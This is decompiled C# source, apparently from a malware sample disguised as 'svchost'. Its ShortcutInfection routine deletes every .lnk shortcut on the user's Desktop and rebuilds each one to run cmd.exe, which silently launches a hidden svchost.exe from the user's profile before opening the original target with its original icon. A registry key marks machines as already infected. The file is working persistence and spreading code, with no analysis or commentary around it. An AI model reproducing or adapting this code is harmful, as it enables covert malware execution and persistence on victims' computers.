using System;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace svchost;

[StandardModule]
internal sealed class SortCut_Install
{
	public static object comp = (object)new Computer();

	public static void ShortcutInfection()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		string text = default(string);
		string text2 = default(string);
		string[] files = default(string[]);
		string text3 = default(string);
		string[] array = default(string[]);
		int num5 = default(int);
		string path = default(string);
		string extension = default(string);
		string fileName = default(string);
		object objectValue = default(object);
		object objectValue2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				object obj2;
				object[] array2;
				object[] array3;
				bool[] array4;
				object obj3;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 863:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 5:
							goto IL_002c;
						case 6:
							goto IL_002f;
						case 4:
						case 7:
						case 8:
							goto IL_0042;
						case 9:
							goto IL_0056;
						case 10:
							goto IL_0066;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_0095;
						case 13:
							goto IL_00a1;
						case 14:
							goto IL_00ad;
						case 15:
							goto IL_00ba;
						case 16:
							goto IL_00d2;
						case 17:
							goto IL_00df;
						case 18:
							goto IL_00f9;
						case 19:
							goto IL_015b;
						case 20:
							goto IL_0194;
						case 21:
							goto IL_01bc;
						case 22:
							goto IL_01e4;
						case 23:
							goto IL_0255;
						case 24:
							goto IL_0293;
						case 25:
							goto IL_029e;
						case 26:
							goto IL_02ba;
						case 27:
							goto IL_02bd;
						case 28:
							goto IL_02c3;
						default:
							goto end_IL_0001;
						case 3:
						case 29:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_029e:
					num = 25;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_02ba;
					IL_0293:
					num = 24;
					File.Delete(text);
					goto IL_029e;
					IL_000a:
					num = 2;
					if (Operators.CompareString(RegValueGet("Black"), "True", false) == 0)
					{
						goto end_IL_0001_2;
					}
					goto IL_002c;
					IL_002c:
					num = 5;
					goto IL_002f;
					IL_002f:
					num = 6;
					RegValueSet("Black", "True");
					goto IL_0042;
					IL_0042:
					num = 8;
					text2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
					goto IL_0056;
					IL_0056:
					num = 9;
					files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
					goto IL_0066;
					IL_0066:
					num = 10;
					text3 = Interaction.Environ(A.PathS) + "\\Microsoft\\svchost.exe";
					goto IL_007f;
					IL_007f:
					num = 11;
					array = files;
					num5 = 0;
					goto IL_02c7;
					IL_02c7:
					if (num5 < array.Length)
					{
						path = array[num5];
						goto IL_0095;
					}
					goto end_IL_0001_2;
					IL_02ba:
					obj = null;
					goto IL_02bd;
					IL_0095:
					num = 12;
					extension = Path.GetExtension(path);
					goto IL_00a1;
					IL_00a1:
					num = 13;
					Path.GetFileNameWithoutExtension(path);
					goto IL_00ad;
					IL_00ad:
					num = 14;
					text = Path.GetFullPath(path);
					goto IL_00ba;
					IL_00ba:
					num = 15;
					if (Operators.CompareString(extension, ".lnk", false) == 0)
					{
						goto IL_00d2;
					}
					goto IL_02bd;
					IL_00d2:
					num = 16;
					fileName = Path.GetFileName(text);
					goto IL_00df;
					IL_00df:
					num = 17;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					goto IL_00f9;
					IL_00f9:
					num = 18;
					obj2 = objectValue;
					array2 = new object[1] { text };
					array3 = array2;
					array4 = new bool[1] { true };
					obj3 = NewLateBinding.LateGet(obj2, (Type)null, "CreateShortcut", array3, (string[])null, (Type[])null, array4);
					if (array4[0])
					{
						text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					objectValue2 = RuntimeHelpers.GetObjectValue(obj3);
					goto IL_015b;
					IL_02c3:
					num = 28;
					goto IL_02c7;
					IL_02bd:
					num5 = checked(num5 + 1);
					goto IL_02c3;
					IL_015b:
					num = 19;
					obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { text2 + fileName }, (string[])null, (Type[])null, (bool[])null);
					goto IL_0194;
					IL_0194:
					num = 20;
					NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
					goto IL_01bc;
					IL_01bc:
					num = 21;
					NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
					goto IL_01e4;
					IL_01e4:
					num = 22;
					NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + text3 + "&explorer /root,\"" + NewLateBinding.LateGet(objectValue2, (Type)null, "TargetPath", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "\" & exit" }, (string[])null, (Type[])null, false, true);
					goto IL_0255;
					IL_0255:
					num = 23;
					NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { NewLateBinding.LateGet(objectValue2, (Type)null, "TargetPath", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null, false, true);
					goto IL_0293;
					end_IL_0001:
					break;
				}
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0001_dispatch = 863;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static string RegValueGet(string name)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(comp, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\ShortCutInfection" }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { name, "" };
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				name = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "error < Not Found >";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object RegValueSet(string name, string values)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(comp, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\ShortCutInfection" }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { name, values };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				name = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				values = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}
}
